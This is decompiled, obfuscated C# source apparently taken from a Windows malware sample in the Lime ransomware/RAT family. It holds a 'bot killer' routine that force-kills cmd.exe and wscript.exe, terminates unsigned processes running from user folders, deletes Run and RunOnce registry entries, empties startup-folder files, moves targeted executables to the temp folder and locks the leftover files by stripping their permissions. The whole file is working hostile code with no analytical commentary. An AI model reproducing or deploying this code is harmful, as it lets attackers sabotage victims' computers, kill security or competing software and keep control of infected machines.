using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

[StandardModule]
internal sealed class Class8
{
	public enum Enum0
	{

	}

	public enum Enum1 : uint
	{

	}

	public enum Enum2 : uint
	{

	}

	public enum Enum3 : uint
	{

	}

	public enum Enum4 : uint
	{

	}

	[Flags]
	public enum Enum5 : uint
	{

	}

	public enum Enum6 : uint
	{

	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public class Class9
	{
		private int int_0;

		private IntPtr intptr_0;

		private IntPtr intptr_1;

		private IntPtr intptr_2;

		public Class9(string string_0)
		{
			Class13.F2pn6WrzFkP6h();
			base._002Ector();
			int_0 = Marshal.SizeOf(typeof(Class9));
			intptr_1 = IntPtr.Zero;
			intptr_2 = IntPtr.Zero;
			intptr_0 = Marshal.StringToCoTaskMemAuto(string_0);
		}

		~Class9()
		{
			Marshal.FreeCoTaskMem(intptr_0);
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public class Class10
	{
		private int int_0;

		private IntPtr intptr_0;

		private IntPtr intptr_1;

		private Enum1 enum1_0;

		private Enum2 enum2_0;

		private Enum3 enum3_0;

		private IntPtr intptr_2;

		private Enum4 enum4_0;

		private IntPtr intptr_3;

		private string string_0;

		private Enum5 enum5_0;

		private Enum6 enum6_0;

		public Class10(string string_1)
		{
			Class13.F2pn6WrzFkP6h();
			base._002Ector();
			int_0 = Marshal.SizeOf(typeof(Class10));
			intptr_0 = IntPtr.Zero;
			intptr_1 = IntPtr.Zero;
			enum1_0 = (Enum1)2u;
			enum2_0 = (Enum2)0u;
			enum3_0 = (Enum3)1u;
			enum4_0 = (Enum4)0u;
			intptr_3 = IntPtr.Zero;
			string_0 = null;
			enum5_0 = (Enum5)256u;
			enum6_0 = (Enum6)0u;
			Class9 structure = new Class9(string_1);
			intptr_2 = Marshal.AllocCoTaskMem(Marshal.SizeOf(typeof(Class9)));
			Marshal.StructureToPtr((object)structure, intptr_2, fDeleteOld: false);
		}

		~Class10()
		{
			Marshal.FreeCoTaskMem(intptr_2);
		}
	}

	public enum Enum7
	{

	}

	public sealed class Class11
	{
		private static readonly IntPtr intptr_0;

		static Class11()
		{
			Class13.F2pn6WrzFkP6h();
			intptr_0 = new IntPtr(-1);
		}

		[DllImport("wintrust.dll", CharSet = CharSet.Unicode, ExactSpelling = true)]
		private static extern Enum7 WinVerifyTrust([In] IntPtr intptr_1, [In][MarshalAs(UnmanagedType.LPStruct)] Guid guid_0, [In] Class10 class10_0);

		public static bool smethod_0(string string_0)
		{
			try
			{
				Class10 class10_ = new Class10(string_0);
				Guid guid_ = new Guid("{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}");
				Enum7 @enum = WinVerifyTrust(intptr_0, guid_, class10_);
				return @enum == (Enum7)0;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		private Class11()
		{
			Class13.F2pn6WrzFkP6h();
			base._002Ector();
		}
	}

	private static int int_0;

	private static int int_1;

	private static string string_0;

	static Class8()
	{
		Class13.F2pn6WrzFkP6h();
		int_0 = 0;
		int_1 = 0;
	}

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool IsWindowVisible(IntPtr intptr_0);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr FindWindow(string string_1, string string_2);

	public static void smethod_0()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 122:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_001a;
						case 4:
							goto IL_002a;
						case 5:
							goto IL_0031;
						case 6:
							goto IL_0038;
						case 7:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 8:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0038:
					num = 6;
					int_0 = 0;
					break;
					IL_0031:
					num = 5;
					smethod_5();
					goto IL_0038;
					IL_000a:
					num = 2;
					Interaction.Shell("TASKKILL /F /IM wscript.exe", (AppWinStyle)0, false, -1);
					goto IL_001a;
					IL_001a:
					num = 3;
					Interaction.Shell("TASKKILL /F /IM cmd.exe", (AppWinStyle)0, false, -1);
					goto IL_002a;
					IL_002a:
					num = 4;
					smethod_1();
					goto IL_0031;
					end_IL_0001_2:
					break;
				}
				num = 7;
				int_1 = 0;
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 122;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_1()
	{
		checked
		{
			try
			{
				Process[] processes = Process.GetProcesses();
				int num = processes.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					Process process = processes[i];
					try
					{
						string fullPath = Path.GetFullPath(process.MainModule!.FileName);
						if (smethod_2(fullPath) && !smethod_4(process.MainWindowTitle))
						{
							smethod_12(process.Id);
							smethod_8(fullPath);
							int_0++;
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static bool smethod_2(string string_1)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		bool result = default(bool);
		FileAttributes attributes = default(FileAttributes);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 618:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0027;
						case 4:
							goto IL_0036;
						case 5:
						case 6:
							goto IL_003f;
						case 7:
							goto IL_004e;
						case 8:
						case 9:
							goto IL_0057;
						case 10:
							goto IL_0067;
						case 11:
						case 12:
							goto IL_0071;
						case 13:
							goto IL_0081;
						case 14:
						case 15:
							goto IL_008b;
						case 16:
							goto IL_00a0;
						case 17:
						case 18:
							goto IL_00a9;
						case 19:
							goto IL_00b9;
						case 20:
						case 21:
							goto IL_00c3;
						case 22:
							goto IL_00d3;
						case 23:
						case 24:
							goto IL_00dd;
						case 25:
							goto IL_00ed;
						case 26:
						case 27:
							goto IL_00f7;
						case 28:
							goto IL_0107;
						case 29:
						case 30:
							goto IL_0111;
						case 31:
							goto IL_0121;
						case 32:
						case 33:
							goto IL_0128;
						case 34:
							goto IL_0133;
						case 35:
						case 36:
							goto IL_013a;
						case 37:
							goto IL_015d;
						case 38:
						case 39:
							goto IL_0164;
						case 40:
							goto IL_016e;
						case 41:
							goto IL_0179;
						case 42:
						case 43:
							goto IL_0180;
						case 44:
							goto IL_018b;
						case 45:
						case 46:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 47:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_018b:
					num = 44;
					result = true;
					goto end_IL_0001_3;
					IL_0180:
					num = 43;
					if ((attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
					{
						break;
					}
					goto IL_018b;
					IL_000a:
					num = 2;
					Path.GetFileNameWithoutExtension(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Class6.string_8);
					goto IL_0027;
					IL_0027:
					num = 3;
					if (string_1.Contains(Application.get_ExecutablePath()))
					{
						goto IL_0036;
					}
					goto IL_003f;
					IL_0036:
					num = 4;
					result = false;
					goto end_IL_0001_3;
					IL_003f:
					num = 6;
					if (string_1.Contains(Class6.string_8))
					{
						goto IL_004e;
					}
					goto IL_0057;
					IL_004e:
					num = 7;
					result = false;
					goto end_IL_0001_3;
					IL_0057:
					num = 9;
					if (string_1.Contains("Ransomware"))
					{
						goto IL_0067;
					}
					goto IL_0071;
					IL_0067:
					num = 10;
					result = false;
					goto end_IL_0001_3;
					IL_0071:
					num = 12;
					if (string_1.EndsWith(".Lime"))
					{
						goto IL_0081;
					}
					goto IL_008b;
					IL_0081:
					num = 13;
					result = false;
					goto end_IL_0001_3;
					IL_008b:
					num = 15;
					if (string_1.ToLower().Contains("malware"))
					{
						goto IL_00a0;
					}
					goto IL_00a9;
					IL_00a0:
					num = 16;
					smethod_8(string_1);
					goto IL_00a9;
					IL_00a9:
					num = 18;
					if (string_1.Contains("Google.com"))
					{
						goto IL_00b9;
					}
					goto IL_00c3;
					IL_00b9:
					num = 19;
					result = false;
					goto end_IL_0001_3;
					IL_00c3:
					num = 21;
					if (string_1.Contains("Microsoft.com"))
					{
						goto IL_00d3;
					}
					goto IL_00dd;
					IL_00d3:
					num = 22;
					result = false;
					goto end_IL_0001_3;
					IL_00dd:
					num = 24;
					if (string_1.Contains("cmd"))
					{
						goto IL_00ed;
					}
					goto IL_00f7;
					IL_00ed:
					num = 25;
					result = true;
					goto end_IL_0001_3;
					IL_00f7:
					num = 27;
					if (string_1.Contains("wscript"))
					{
						goto IL_0107;
					}
					goto IL_0111;
					IL_0107:
					num = 28;
					result = true;
					goto end_IL_0001_3;
					IL_0111:
					num = 30;
					if (string_1.Contains(RuntimeEnvironment.GetRuntimeDirectory()))
					{
						goto IL_0121;
					}
					goto IL_0128;
					IL_0121:
					num = 31;
					result = true;
					goto end_IL_0001_3;
					IL_0128:
					num = 33;
					if (Class11.smethod_0(string_1))
					{
						goto IL_0133;
					}
					goto IL_013a;
					IL_0133:
					num = 34;
					result = false;
					goto end_IL_0001_3;
					IL_013a:
					num = 36;
					if (string_1.Contains(Environment.GetEnvironmentVariable("USERPROFILE")) | string_1.Contains(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData)))
					{
						goto IL_015d;
					}
					goto IL_0164;
					IL_015d:
					num = 37;
					result = true;
					goto end_IL_0001_3;
					IL_0164:
					num = 39;
					attributes = File.GetAttributes(string_1);
					goto IL_016e;
					IL_016e:
					num = 40;
					if ((attributes & FileAttributes.System) == FileAttributes.System)
					{
						goto IL_0179;
					}
					goto IL_0180;
					IL_0179:
					num = 41;
					result = true;
					goto end_IL_0001_3;
					end_IL_0001_2:
					break;
				}
				num = 46;
				result = false;
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 618;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void smethod_3(string string_1)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity directorySecurity = new DirectorySecurity();
			directorySecurity.SetAccessRuleProtection(isProtected: true, preserveInheritance: false);
			directoryInfo.SetAccessControl(directorySecurity);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static bool smethod_4(string string_1)
	{
		try
		{
			IntPtr intptr_ = FindWindow(null, string_1);
			return IsWindowVisible(intptr_);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void smethod_5()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string current = default(string);
		IEnumerator<string> enumerator = default(IEnumerator<string>);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 399:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0017;
						case 4:
							goto IL_0024;
						case 5:
							goto IL_002d;
						case 6:
							goto IL_003a;
						case 7:
						case 8:
							goto IL_0047;
						case 9:
							goto IL_0064;
						case 10:
							goto IL_00a9;
						case 11:
							goto IL_00e9;
						case 12:
							goto IL_00f2;
						case 13:
							goto IL_00fc;
						case 14:
							goto IL_0105;
						case 15:
							goto IL_010f;
						case 16:
						case 17:
							goto IL_0118;
						case 18:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 19:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_010f:
					num = 15;
					smethod_8(current);
					goto IL_0118;
					IL_0105:
					num = 14;
					Thread.Sleep(50);
					goto IL_010f;
					IL_000a:
					num = 2;
					smethod_6("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 1);
					goto IL_0017;
					IL_0017:
					num = 3;
					smethod_6("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\", 1);
					goto IL_0024;
					IL_0024:
					num = 4;
					if (smethod_9())
					{
						goto IL_002d;
					}
					goto IL_0047;
					IL_002d:
					num = 5;
					smethod_6("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 2);
					goto IL_003a;
					IL_003a:
					num = 6;
					smethod_6("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\", 2);
					goto IL_0047;
					IL_0047:
					num = 8;
					Path.GetFileNameWithoutExtension(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Class6.string_8);
					goto IL_0064;
					IL_0064:
					num = 9;
					enumerator = ((ServerComputer)Class3.Class2_0).get_FileSystem().GetFiles(((ServerComputer)Class3.Class2_0).get_FileSystem().get_SpecialDirectories().get_Programs() + "\\Startup").GetEnumerator();
					goto IL_009a;
					IL_009a:
					if (!enumerator.MoveNext())
					{
						break;
					}
					current = enumerator.Current;
					goto IL_00a9;
					IL_0118:
					num = 17;
					goto IL_009a;
					IL_00a9:
					num = 10;
					if (!current.Contains(Class6.string_8) & !current.Contains(Application.get_ExecutablePath()) & !current.Contains("Ransomware") & !current.EndsWith(".Lime"))
					{
						goto IL_00e9;
					}
					goto IL_0118;
					IL_00e9:
					num = 11;
					smethod_8(current);
					goto IL_00f2;
					IL_00f2:
					num = 12;
					Thread.Sleep(50);
					goto IL_00fc;
					IL_00fc:
					num = 13;
					smethod_8(current);
					goto IL_0105;
					end_IL_0001_2:
					break;
				}
				num = 18;
				enumerator?.Dispose();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 399;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_6(string string_1, int int_2)
	{
		try
		{
			RegistryKey registryKey = default(RegistryKey);
			if (int_2 == 1)
			{
				registryKey = Registry.CurrentUser.OpenSubKey(string_1);
			}
			if (int_2 == 2)
			{
				registryKey = Registry.LocalMachine.OpenSubKey(string_1);
			}
			string[] valueNames = registryKey.GetValueNames();
			foreach (string text in valueNames)
			{
				try
				{
					string text2 = registryKey.GetValue(text)!.ToString();
					if (text2.Contains("-"))
					{
						if (text2.Contains("\""))
						{
							text2.Replace("\"", string.Empty);
						}
						try
						{
							string[] array = Strings.Split(text2, " -", -1, (CompareMethod)0);
							text2 = array[0];
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
					if (text2.Contains("\""))
					{
						object[] array2 = text2.Split(new char[1] { '"' });
						text2 = Conversions.ToString(array2[1]);
					}
					if (!text2.Contains(Class6.string_8))
					{
						smethod_7(int_2, text, string_1, text2);
						if (!Class11.smethod_0(text2))
						{
							smethod_11(text2);
							smethod_8(text2);
						}
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_7(int int_2, string string_1, string string_2, string string_3)
	{
		try
		{
			RegistryKey registryKey = null;
			registryKey = ((int_2 != 1) ? Registry.LocalMachine.OpenSubKey(string_2, writable: true) : Registry.CurrentUser.OpenSubKey(string_2, writable: true));
			using (registryKey)
			{
				registryKey?.DeleteValue(string_1);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_8(string string_1)
	{
		try
		{
			if (File.Exists(string_1))
			{
				Random random = new Random();
				try
				{
					smethod_10(string_1);
					((ServerComputer)Class3.Class2_0).get_FileSystem().MoveFile(string_1, Path.GetTempPath() + Conversions.ToString(random.Next(10000, 90000)));
					File.WriteAllText(string_1, string.Empty);
					FileSystem.FileOpen(FileSystem.FreeFile(), string_1, (OpenMode)1, (OpenAccess)(-1), (OpenShare)0, -1);
					smethod_3(string_1);
					return;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
					DirectorySecurity directorySecurity = new DirectorySecurity();
					directorySecurity.SetAccessRuleProtection(isProtected: true, preserveInheritance: false);
					directoryInfo.SetAccessControl(directorySecurity);
					ProjectData.ClearProjectError();
					return;
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static bool smethod_9()
	{
		try
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
			return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void smethod_10(string string_1)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity directorySecurity = new DirectorySecurity();
			directorySecurity.SetAccessRuleProtection(isProtected: false, preserveInheritance: true);
			directoryInfo.SetAccessControl(directorySecurity);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_11(string string_1)
	{
		checked
		{
			try
			{
				if (string_1.Contains(Process.GetCurrentProcess().ProcessName.ToString()))
				{
					return;
				}
				if (string_1.Contains("\\"))
				{
					string[] array = Strings.Split(string_1, "\\", -1, (CompareMethod)0);
					string[] array2 = array;
					foreach (string text in array2)
					{
						if (text.Contains(".exe"))
						{
							string_1 = text;
						}
					}
				}
				if (string_1.Contains(".exe"))
				{
					string_1 = string_1.Replace(".exe", string.Empty);
				}
				Process[] processes = Process.GetProcesses();
				int num = processes.Length - 1;
				for (int j = 0; j <= num; j++)
				{
					Process process = processes[j];
					if (process.ProcessName.Contains(string_1))
					{
						smethod_12(process.Id);
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void smethod_12(int int_2)
	{
		try
		{
			Process processById = Process.GetProcessById(int_2);
			if (Operators.CompareString(processById.ProcessName, string.Empty, false) == 0)
			{
				return;
			}
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = processById.Threads.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ProcessThread processThread = (ProcessThread)enumerator.Current;
					IntPtr intPtr = OpenThread((Enum0)3, bool_0: true, checked((uint)processThread.Id));
					if (intPtr != IntPtr.Zero)
					{
						SuspendThread(intPtr);
						TerminateThread(intPtr, 1u);
						CloseHandle(intPtr);
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool CloseHandle(IntPtr intptr_0);

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenThread(Enum0 enum0_0, bool bool_0, uint uint_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern int SuspendThread(IntPtr intptr_0);

	[DllImport("kernel32.dll")]
	private static extern bool TerminateThread(IntPtr intptr_0, uint uint_0);
}
